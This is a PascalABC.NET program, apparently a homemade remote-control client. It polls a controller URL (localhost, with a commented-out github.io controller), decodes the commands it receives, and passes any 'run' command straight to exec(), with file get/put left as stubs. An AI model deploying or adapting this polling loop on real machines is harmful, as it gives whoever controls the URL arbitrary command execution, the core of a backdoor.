uses System.IO, System.Net;
 
var
	url:string;

function urlopen(url:string):string;
var 
	html : string;
	// url : string := 'http://programmersforum.ru/showthread.php?p=1658760';
begin
	var myRequest : HttpWebRequest := HttpWebRequest(WebRequest.Create(url));
	myRequest.Method := 'GET';
	var myResponse : WebResponse := myRequest.GetResponse();
	var sr : StreamReader := new StreamReader(myResponse.GetResponseStream(), System.Text.Encoding.UTF8);
	html := sr.ReadToEnd();
	sr.Close();
	myResponse.Close();
	urlopen:=html;  
	// writeln(html); // в html как раз и хранится код сайта
end;

function len(q:
	string):integer;begin len:=q.length;end;
function len(q:
	array of string):integer;begin len:=length(q);end;
function len(q:
	array of array of string):integer;begin len:=length(q);end;
function len(q:
	array of array of array of string):integer;begin len:=length(q);end;
function len(q:
	array of integer):integer;begin len:=length(q);end;
function len(q:
	array of array of integer):integer;begin len:=length(q);end;
function len(q:
	array of array of array of integer):integer;begin len:=length(q);end;
function len(q:
	array of real):integer;begin len:=length(q);end;
function len(q:
	array of array of real):integer;begin len:=length(q);end;
function len(q:
	array of array of array of real):integer;begin len:=length(q);end;

procedure push_back(var a: array of
	integer; value:
	integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of integer; value:
	array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of integer; value:
	array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of integer; value:
	array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of integer; value:
	array of array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of array of integer; value:
	array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of array of array of integer; value:
	array of array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	real; value:
	real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of real; value:
	array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of real; value:
	array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of real; value:
	array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of real; value:
	array of array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of array of real; value:
	array of array of array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of array of array of real; value:
	array of array of array of array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	string; value:
	string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of string; value:
	array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of string; value:
	array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of string; value:
	array of array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of string; value:
	array of array of array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
procedure push_back(var a: array of
	array of array of array of array of array of string; value:
	array of array of array of array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;

procedure emplace_back(var a: array of
	integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of array of real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of array of array of real);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	string);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of string);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of string);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of string);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of string);begin SetLength(a, length(a) + 1);end;
procedure emplace_back(var a: array of
	array of array of array of array of array of string);begin SetLength(a, length(a) + 1);end;

function int(q:string):integer;
begin
	var e:=0;
	if not(integer.tryparse(q,e)) then println('error in int with',q);
	int:=e;
end;

function communicate(q: array of string):array of string;
begin
	var t:string;
	for var w:=0 to len(q)-1 do
	begin
		t+='q';
		for var e:=1 to len(q[w]) do
		begin
			t+='w';
			var o:=ord(q[w][e]).tostring();
			while len(o)<10 do
			begin
				o:='0'+o;
			end;
			t+=o;
		end;
	end;
	t+='r';
	var i:string;
	while len(t)>0 do
	begin
		if len(t)>96 then
		begin
			i+=urlopen(url+'usr'+t[1:97]);
			t:=t[97:];
		end
		else
		begin
			i+=urlopen(url+'usr'+t[1:]);
			t:='';
		end;
	end;
	t:=i;
	var u:array of string;
	SetLength(u,1);
	SetLength(u,0);
	while len(t)>0 do
	begin
		if      t[1]='q' then
		begin
			emplace_back(u);
			t:=t[2:];
		end
		else if t[1]='w' then
		begin
			u[len(u)-1]+=chr(int(t[2:12]));
			t:=t[12:];
		end
		else
		begin
			if len(t)>1 then t:=t[2:] else t:='';
		end;
	end;
	communicate:=u;
end;

begin
	// url:=urlopen('https://sudo-gera.github.io/controller/');
	url:='http://127.0.0.1:9999/';
	while true do
	begin
		var todo:=communicate(arr('download'));
		if len(todo)>0 then
		begin
			if todo[0]='exit' then
			begin
				halt;
			end
			else if todo[0]='get' then
			begin
				if len(todo)>1 then
				begin
					// open(todo[1]).read()
				end;
			end
			else if todo[0]='put' then
			begin
				if len(todo)>1 then
				begin
					println(todo[1]);
					// open(todo[1]).write()
				end;
			end 
			else if todo[0]='run' then
			begin
				if len(todo)>1 then
				begin
					exec(todo[1]);
				end;
			end 
		end
		else
			sleep(100);
	end;
end.